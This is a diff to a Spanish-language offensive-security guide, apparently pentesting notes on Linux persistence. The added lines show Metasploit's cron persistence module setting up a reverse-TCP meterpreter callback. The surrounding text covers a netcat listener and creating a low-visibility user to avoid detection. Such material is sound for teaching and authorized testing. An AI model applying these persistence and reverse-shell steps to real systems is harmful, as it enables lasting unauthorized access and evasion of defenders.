@@ -115,6 +115,15 @@ crontab -i cron
 
 Para establecer una conexión a partir de este momento basta con crear un listener en nuestra máquina kali con `nc -nvlp puerto_kali` y esperar a que se ejecute el comando en el objetivo.
 
+Esto se puede automatizar mediante **metasploit** con el módulo `exploit/multi/persistence/cron`, `cron_persistence` en versiones anteriores de `msfconsole`.
+
+```bash
+msf > use exploit/multi/persistence/cron 
+[*] No payload configured, defaulting to cmd/linux/ftp/x64/meterpreter/reverse_tcp
+msf exploit(multi/persistence/cron) > set session id
+msf exploit(multi/persistence/cron) > run
+```
+
 ### Creando un usuario
 
 El usuario debería pasar lo más desapercibido posible, por lo que se pueden ajustar algunos parámetros para evitar reducir el riesgo de detección:
